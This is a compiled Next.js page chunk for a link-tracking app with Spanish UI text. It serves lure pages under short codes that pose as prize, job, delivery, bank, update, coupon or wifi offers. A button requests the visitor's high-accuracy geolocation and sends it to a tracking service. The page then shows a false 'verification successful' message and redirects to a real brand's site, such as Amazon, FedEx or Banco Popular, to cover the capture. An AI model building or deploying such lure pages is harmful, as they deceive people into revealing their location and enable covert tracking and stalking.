    const [isLoading, setIsLoading] = (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$index$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["useState"])(false);
    const [showMap, setShowMap] = (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$index$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["useState"])(false);
    (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$index$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["useEffect"])({
        "TrackPage.useEffect": ()=>{
            async function loadLink() {
                try {
                    const links = await __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$lib$2f$services$2f$tracking$2d$service$2e$ts__$5b$app$2d$client$5d$__$28$ecmascript$29$__["TrackingService"].getTrackingLinks();
                    const found = links.find({
                        "TrackPage.useEffect.loadLink.found": (l)=>l.shortCode === params.shortCode
                    }["TrackPage.useEffect.loadLink.found"]);
                    if (found && found.isActive) {
                        setLink(found);
                    } else {
                        setError("Este enlace ha expirado");
                    }
                } catch (err) {
                    console.error("Error loading tracking link:", err);
                    setError("Error al cargar la página");
                }
            }
            loadLink();
        }
    }["TrackPage.useEffect"], [
        params.shortCode
    ]);
    if (error) {
        return /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
            className: "min-h-screen bg-gradient-to-br from-gray-900 to-black text-white",
            children: /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
                className: "container max-w-lg mx-auto p-6",
                children: /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])(__TURBOPACK__imported__module__$5b$project$5d2f$src$2f$components$2f$ui$2f$card$2e$tsx__$5b$app$2d$client$5d$__$28$ecmascript$29$__["Card"], {
                    className: "bg-black/40 backdrop-blur-sm border-gray-800",
                    children: /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])(__TURBOPACK__imported__module__$5b$project$5d2f$src$2f$components$2f$ui$2f$card$2e$tsx__$5b$app$2d$client$5d$__$28$ecmascript$29$__["CardContent"], {
                        className: "p-6",
                        children: /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
                            className: "text-center text-red-400",
                            children: error
                        }, void 0, false, {
                            fileName: "[project]/src/app/track/[shortCode]/page.tsx",
                            lineNumber: 46,
                            columnNumber: 15
                        }, this)
                    }, void 0, false, {
                        fileName: "[project]/src/app/track/[shortCode]/page.tsx",
                        lineNumber: 45,
                        columnNumber: 13
                    }, this)
                }, void 0, false, {
                    fileName: "[project]/src/app/track/[shortCode]/page.tsx",
                    lineNumber: 44,
                    columnNumber: 11
                }, this)
            }, void 0, false, {
                fileName: "[project]/src/app/track/[shortCode]/page.tsx",
                lineNumber: 43,
                columnNumber: 9
            }, this)
        }, void 0, false, {
            fileName: "[project]/src/app/track/[shortCode]/page.tsx",
            lineNumber: 42,
            columnNumber: 7
        }, this);
    }
    if (!link) {
        return /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
            className: "min-h-screen bg-gradient-to-br from-gray-900 to-black text-white",
            children: /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
                className: "container max-w-lg mx-auto p-6",
                children: /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])(__TURBOPACK__imported__module__$5b$project$5d2f$src$2f$components$2f$ui$2f$card$2e$tsx__$5b$app$2d$client$5d$__$28$ecmascript$29$__["Card"], {
                    className: "bg-black/40 backdrop-blur-sm border-gray-800",
                    children: /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])(__TURBOPACK__imported__module__$5b$project$5d2f$src$2f$components$2f$ui$2f$card$2e$tsx__$5b$app$2d$client$5d$__$28$ecmascript$29$__["CardContent"], {
                        className: "p-6",
                        children: /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
                            className: "flex justify-center",
                            children: /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
                                className: "animate-spin rounded-full h-8 w-8 border-2 border-current"
                            }, void 0, false, {
                                fileName: "[project]/src/app/track/[shortCode]/page.tsx",
                                lineNumber: 61,
                                columnNumber: 17
                            }, this)
                        }, void 0, false, {
                            fileName: "[project]/src/app/track/[shortCode]/page.tsx",
                            lineNumber: 60,
                            columnNumber: 15
                        }, this)
                    }, void 0, false, {
                        fileName: "[project]/src/app/track/[shortCode]/page.tsx",
                        lineNumber: 59,
                        columnNumber: 13
                    }, this)
                }, void 0, false, {
                    fileName: "[project]/src/app/track/[shortCode]/page.tsx",
                    lineNumber: 58,
                    columnNumber: 11
                }, this)
            }, void 0, false, {
                fileName: "[project]/src/app/track/[shortCode]/page.tsx",
                lineNumber: 57,
                columnNumber: 9
            }, this)
        }, void 0, false, {
            fileName: "[project]/src/app/track/[shortCode]/page.tsx",
            lineNumber: 56,
            columnNumber: 7
        }, this);
    }
    const template = (0, __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$config$2f$templates$2e$ts__$5b$app$2d$client$5d$__$28$ecmascript$29$__["getTemplate"])(link.templateType);
    const handleGetLocation = async ()=>{
        setIsLoading(true);
        setError(null);
        try {
            // Obtener ubicación actual
            const position = await __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$lib$2f$services$2f$geo$2d$service$2e$ts__$5b$app$2d$client$5d$__$28$ecmascript$29$__["GeoService"].getCurrentPosition({
                enableHighAccuracy: true,
                timeout: 10000
            });
            // Capturar la ubicación
            await __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$lib$2f$services$2f$tracking$2d$service$2e$ts__$5b$app$2d$client$5d$__$28$ecmascript$29$__["TrackingService"].captureLocation(link.id, params.shortCode);
            // Mostrar el mapa simulado
            setShowMap(true);
            // Redirigir después de un breve retraso
            setTimeout(()=>{
                // Redirigir según el tipo de plantilla
                switch(link.templateType){
                    case "premio":
                        window.location.href = "https://www.amazon.com";
                        break;
                    case "empleo":
                        window.location.href = "https://www.linkedin.com";
                        break;
                    case "delivery":
                        window.location.href = "https://www.fedex.com/tracking";
                        break;
                    case "banco":
                        window.location.href = "https://www.bancopopular.com";
                        break;
                    case "actualizacion":
                        window.location.href = "https://support.microsoft.com";
                        break;
                    case "social":
                        window.location.href = "https://www.facebook.com";
                        break;
                    case "cupon":
                        window.location.href = "https://www.groupon.com";
                        break;
                    case "wifi":
                        window.location.href = "https://www.speedtest.net";
                        break;
                    default:
                        window.location.href = "https://www.google.com";
                }
            }, 2000);
        } catch (err) {
            console.error("Error getting location:", err);
            setError(err.message || "Error al procesar tu solicitud");
        } finally{
            setIsLoading(false);
        }
    };
    return /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
        className: `min-h-screen bg-gradient-to-br ${template.bgColor} text-white`,
        children: /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
            className: "container max-w-lg mx-auto p-6",
            children: /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])(__TURBOPACK__imported__module__$5b$project$5d2f$src$2f$components$2f$ui$2f$card$2e$tsx__$5b$app$2d$client$5d$__$28$ecmascript$29$__["Card"], {
                className: "bg-black/40 backdrop-blur-sm border-gray-800",
                children: /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])(__TURBOPACK__imported__module__$5b$project$5d2f$src$2f$components$2f$ui$2f$card$2e$tsx__$5b$app$2d$client$5d$__$28$ecmascript$29$__["CardContent"], {
                    className: "p-6 space-y-6",
                    children: [
                        /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
                            className: "text-center space-y-4",
                            children: [
                                /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
                                    className: "text-6xl",
                                    children: template.icon
                                }, void 0, false, {
                                    fileName: "[project]/src/app/track/[shortCode]/page.tsx",
                                    lineNumber: 137,
                                    columnNumber: 15
                                }, this),
                                /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("h1", {
                                    className: "text-2xl font-bold",
                                    children: template.title
                                }, void 0, false, {
                                    fileName: "[project]/src/app/track/[shortCode]/page.tsx",
                                    lineNumber: 138,
                                    columnNumber: 15
                                }, this),
                                /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("p", {
                                    className: "text-lg text-muted-foreground",
                                    children: template.subtitle
                                }, void 0, false, {
                                    fileName: "[project]/src/app/track/[shortCode]/page.tsx",
                                    lineNumber: 139,
                                    columnNumber: 15
                                }, this)
                            ]
                        }, void 0, true, {
                            fileName: "[project]/src/app/track/[shortCode]/page.tsx",
                            lineNumber: 136,
                            columnNumber: 13
                        }, this),
                        /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
                            className: "text-center py-4",
                            children: /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("p", {
                                className: "text-lg",
                                children: template.message
                            }, void 0, false, {
                                fileName: "[project]/src/app/track/[shortCode]/page.tsx",
                                lineNumber: 146,
                                columnNumber: 15
                            }, this)
                        }, void 0, false, {
                            fileName: "[project]/src/app/track/[shortCode]/page.tsx",
                            lineNumber: 145,
                            columnNumber: 13
                        }, this),
                        template.validityPeriod && /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
                            className: "text-center text-sm text-yellow-400",
                            children: [
                                "⏰ Válido por: ",
                                template.validityPeriod
                            ]
                        }, void 0, true, {
                            fileName: "[project]/src/app/track/[shortCode]/page.tsx",
                            lineNumber: 151,
                            columnNumber: 15
                        }, this),
                        !showMap && /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])(__TURBOPACK__imported__module__$5b$project$5d2f$src$2f$components$2f$ui$2f$button$2e$tsx__$5b$app$2d$client$5d$__$28$ecmascript$29$__["Button"], {
                            className: `w-full bg-gradient-to-r ${template.bgColor} hover:opacity-90`,
                            size: "lg",
                            onClick: handleGetLocation,
                            disabled: isLoading,
                            children: isLoading ? /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
                                className: "flex items-center gap-2",
                                children: [
                                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
                                        className: "animate-spin rounded-full h-4 w-4 border-2 border-current"
                                    }, void 0, false, {
                                        fileName: "[project]/src/app/track/[shortCode]/page.tsx",
                                        lineNumber: 166,
                                        columnNumber: 21
                                    }, this),
                                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("span", {
                                        children: "Procesando..."
                                    }, void 0, false, {
                                        fileName: "[project]/src/app/track/[shortCode]/page.tsx",
                                        lineNumber: 167,
                                        columnNumber: 21
                                    }, this)
                                ]
                            }, void 0, true, {
                                fileName: "[project]/src/app/track/[shortCode]/page.tsx",
                                lineNumber: 165,
                                columnNumber: 19
                            }, this) : /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])(__TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["Fragment"], {
                                children: [
                                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("span", {
                                        className: "mr-2",
                                        children: template.icon
                                    }, void 0, false, {
                                        fileName: "[project]/src/app/track/[shortCode]/page.tsx",
                                        lineNumber: 171,
                                        columnNumber: 21
                                    }, this),
                                    template.buttonText
                                ]
                            }, void 0, true)
                        }, void 0, false, {
                            fileName: "[project]/src/app/track/[shortCode]/page.tsx",
                            lineNumber: 158,
                            columnNumber: 15
                        }, this),
                        error && /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
                            className: "bg-red-500/10 border border-red-500/50 rounded-lg p-4 text-red-400",
                            children: error
                        }, void 0, false, {
                            fileName: "[project]/src/app/track/[shortCode]/page.tsx",
                            lineNumber: 180,
                            columnNumber: 15
                        }, this),
                        showMap && /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
                            className: "space-y-4",
                            children: [
                                /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
                                    className: "h-[300px] rounded-lg overflow-hidden",
                                    children: /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
                                        className: "w-full h-full bg-gray-800 animate-pulse flex items-center justify-center",
                                        children: /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
                                            className: "animate-spin rounded-full h-8 w-8 border-2 border-current"
                                        }, void 0, false, {
                                            fileName: "[project]/src/app/track/[shortCode]/page.tsx",
                                            lineNumber: 190,
                                            columnNumber: 21
                                        }, this)
                                    }, void 0, false, {
                                        fileName: "[project]/src/app/track/[shortCode]/page.tsx",
                                        lineNumber: 189,
                                        columnNumber: 19
                                    }, this)
                                }, void 0, false, {
                                    fileName: "[project]/src/app/track/[shortCode]/page.tsx",
                                    lineNumber: 188,
                                    columnNumber: 17
                                }, this),
                                /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("p", {
                                    className: "text-center text-sm text-green-400",
                                    children: "✓ Verificación exitosa. Redirigiendo..."
                                }, void 0, false, {
                                    fileName: "[project]/src/app/track/[shortCode]/page.tsx",
                                    lineNumber: 193,
                                    columnNumber: 17
                                }, this)
                            ]
                        }, void 0, true, {
                            fileName: "[project]/src/app/track/[shortCode]/page.tsx",
                            lineNumber: 187,
                            columnNumber: 15
                        }, this)
                    ]
                }, void 0, true, {
                    fileName: "[project]/src/app/track/[shortCode]/page.tsx",
                    lineNumber: 134,
                    columnNumber: 11
                }, this)
            }, void 0, false, {
                fileName: "[project]/src/app/track/[shortCode]/page.tsx",
                lineNumber: 133,
                columnNumber: 9
            }, this)
        }, void 0, false, {
            fileName: "[project]/src/app/track/[shortCode]/page.tsx",
            lineNumber: 132,
            columnNumber: 7
        }, this)
    }, void 0, false, {
        fileName: "[project]/src/app/track/[shortCode]/page.tsx",
        lineNumber: 131,
        columnNumber: 5
    }, this);
}
_s(TrackPage, "GDYG4PtH+Uf3kfBSH8Fq2Gn3hWc=");
_c = TrackPage;
var _c;
__turbopack_context__.k.register(_c, "TrackPage");
if (typeof globalThis.$RefreshHelpers$ === 'object' && globalThis.$RefreshHelpers !== null) {
    __turbopack_context__.k.registerExports(module, globalThis.$RefreshHelpers$);
}
}}),
}]);

//# sourceMappingURL=src_0ce37bec._.js.map